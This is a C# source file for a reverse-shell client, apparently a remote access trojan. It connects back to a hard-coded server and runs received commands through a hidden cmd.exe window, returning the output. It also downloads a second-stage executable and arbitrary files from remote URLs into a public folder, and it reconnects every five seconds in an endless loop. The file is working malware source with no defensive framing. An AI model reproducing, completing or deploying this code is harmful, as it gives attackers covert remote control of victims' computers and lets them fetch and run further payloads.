using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
namespace Client
{
    class Program
    {
        static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static int shelldownloadCount = 0;

        static void socketConnect()
        {
            
            IPEndPoint connectAddress = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8000); // Server IP & PORT 
            sck.Connect(connectAddress);
        }

        static void DownloadFile()
        {
            WebClient downloadFile = new WebClient();
            byte[] requestUrl = Encoding.Default.GetBytes("Enter URL: ");
            sck.Send(requestUrl, 0, requestUrl.Length, 0);
            byte[] urlbuffer = new byte[255];
            int recUrl = sck.Receive(urlbuffer, 0, urlbuffer.Length, 0);
            Array.Resize(ref urlbuffer, recUrl);
            string url = Encoding.Default.GetString(urlbuffer);
            string replacment = Regex.Replace(url, @"\n", "");
            downloadFile.DownloadFileAsync(new Uri(replacment), @"c:\Users\Public\file");

          
        }
        static void DownloadShell()
        {
            byte[] downloadingMsg = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
            sck.Send(downloadingMsg, 0, downloadingMsg.Length, 0);
            WebClient secondShell = new WebClient();
            secondShell.DownloadFile(new Uri("www.www.www"), @"C:\Users\Public\SecondSession.exe"); //second client session enter remote address
        }

       
        public static bool ExecuteCommand()
        {


            if(shelldownloadCount == 0)
            {
                DownloadShell();
                shelldownloadCount = 1;
            }
            
            
            byte[] buffer = new byte[255]; // buffer for recieved command
            int rec = sck.Receive(buffer, 0, buffer.Length, 0); // receving

            Array.Resize(ref buffer, rec);
            string command = Encoding.Default.GetString(buffer); // recieved command from bytes to string


            if (command == "quit\n") // quit and close socket
            {
                sck.Close();
            }
            else if (command == "downloadfile\n")
            {
                DownloadFile();
            }
            else
            {
                // execute command
                Process p = new Process();
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/C " + command;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();

                // sending command output
                byte[] outputbuf = Encoding.Default.GetBytes(output);
                byte[] errorbuf = Encoding.Default.GetBytes(error);
                sck.Send(outputbuf, 0, outputbuf.Length, 0);
                sck.Send(errorbuf, 0, errorbuf.Length, 0);
                
            }
            return false;
        }

        public static void Main(string[] args)
        {

            while (true)
            {
                bool socketDEAD = false;
                try
                {
                    socketConnect();
                    while (socketDEAD != true)
                    {
                        socketDEAD = ExecuteCommand();
                    }
                    sck.Close();

                }
                catch (Exception ex)
                {

                    System.Threading.Thread.Sleep(5000); // Sleep time before reconnect
                    sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                }
                
                
                

            }

                                  

                
        }
    }
}
